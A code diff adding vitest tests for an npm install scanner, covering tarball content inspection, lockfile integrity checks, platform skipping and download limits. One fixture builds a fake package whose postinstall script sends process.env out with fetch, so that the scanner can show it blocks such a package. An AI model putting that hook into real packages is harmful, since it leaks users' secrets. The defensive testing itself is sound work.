@@ -1,5 +1,7 @@
+import { createHash } from "node:crypto";
 import { describe, expect, it } from "vitest";
 import { planInstall, planInstallOnline } from "./scan.ts";
+import { tar } from "./test-tar.ts";
 
 const lock = (packages: Record<string, object>) =>
   JSON.stringify({
@@ -152,6 +154,7 @@ describe("planInstallOnline", () => {
     const outcome = await planInstallOnline(before, after, {
       fetch: counting,
       now,
+      content: false,
     });
     expect(calls).toBe(1);
     expect(
@@ -185,5 +188,121 @@ describe("planInstallOnline", () => {
       now,
     });
     expect(outcome.status).toBe("complete");
+  });
+});
+
+describe("planInstallOnline: package contents", () => {
+  const now = new Date("2026-10-25T00:00:00Z");
+  const packument = JSON.stringify({
+    name: "p",
+    time: { created: "2020-01-01T00:00:00Z", "1.0.0": "2025-01-01T00:00:00Z" },
+    versions: { "1.0.0": {} },
+  });
+  const tarball = (files: Record<string, string>) =>
+    tar(
+      Object.entries(files).map(([name, content]) => ({
+        name: `package/${name}`,
+        content,
+      })),
+    );
+  const sri = (data: Buffer) =>
+    `sha512-${createHash("sha512").update(data).digest("base64")}`;
+  const serve =
+    (tgz: Buffer): typeof fetch =>
+    async (input) =>
+      String(input).endsWith(".tgz")
+        ? new Response(tgz, { status: 200 })
+        : new Response(packument, { status: 200 });
+  const planWith = (integrity: string) =>
+    JSON.stringify({
+      lockfileVersion: 3,
+      packages: {
+        "": {},
+        "node_modules/p": {
+          version: "1.0.0",
+          resolved: "https://registry.npmjs.org/p/-/p-1.0.0.tgz",
+          integrity,
+        },
+      },
+    });
+
+  it("inspects the downloaded package and blocks malicious contents", async () => {
+    const tgz = tarball({
+      "package.json": JSON.stringify({
+        name: "p",
+        scripts: { postinstall: "node s.js" },
+      }),
+      "s.js": "fetch(u, { body: JSON.stringify(process.env) });",
+    });
+    const outcome = await planInstallOnline(undefined, planWith(sri(tgz)), {
+      fetch: serve(tgz),
+      now,
+    });
+    expect(outcome).toMatchObject({ status: "complete", verdict: "block" });
+    expect(
+      outcome.status === "complete" &&
+        outcome.findings.some((f) => f.file === "p@1.0.0/package.json"),
+    ).toBe(true);
+  });
+
+  it("blocks a tarball that does not match the lockfile integrity", async () => {
+    const tgz = tarball({ "package.json": "{}" });
+    const outcome = await planInstallOnline(
+      undefined,
+      planWith(sri(Buffer.from("other"))),
+      { fetch: serve(tgz), now },
+    );
+    expect(outcome.status === "complete" && outcome.findings[0]).toMatchObject({
+      ruleId: "install/integrity",
+      severity: "block",
+    });
+  });
+
+  it("does not check platform packages npm will not install here", async () => {
+    const urls: string[] = [];
+    const lockfile = JSON.stringify({
+      lockfileVersion: 3,
+      packages: {
+        "": {},
+        "node_modules/p": {
+          version: "1.0.0",
+          resolved: "https://registry.npmjs.org/p/-/p-1.0.0.tgz",
+          integrity: "sha512-x",
+          os: ["win32"],
+          cpu: ["x64"],
+          optional: true,
+        },
+      },
+    });
+    const outcome = await planInstallOnline(undefined, lockfile, {
+      fetch: async (input) => {
+        urls.push(String(input));
+        return new Response("{}", { status: 200 });
+      },
+      now,
+      platform: { os: "darwin", cpu: "arm64" },
+    });
+    expect(urls).toEqual([]);
+    expect(outcome).toMatchObject({ status: "complete", verdict: "allow" });
+    expect(outcome.status === "complete" && outcome.findings).toEqual([
+      expect.objectContaining({
+        ruleId: "install/other-platform",
+        severity: "info",
+        message: expect.stringContaining("darwin-arm64"),
+      }),
+    ]);
+  });
+
+  it("is incomplete when the plan exceeds the download budget", async () => {
+    const tgz = tarball({ "package.json": "{}", "a.js": "x".repeat(5000) });
+    const outcome = await planInstallOnline(undefined, planWith(sri(tgz)), {
+      fetch: serve(tgz),
+      now,
+      maxDownloadBytes: 10,
+    });
+    expect(outcome).toMatchObject({
+      status: "incomplete",
+      reason: expect.stringContaining("bytes of tarballs"),
+    });
   });
 });
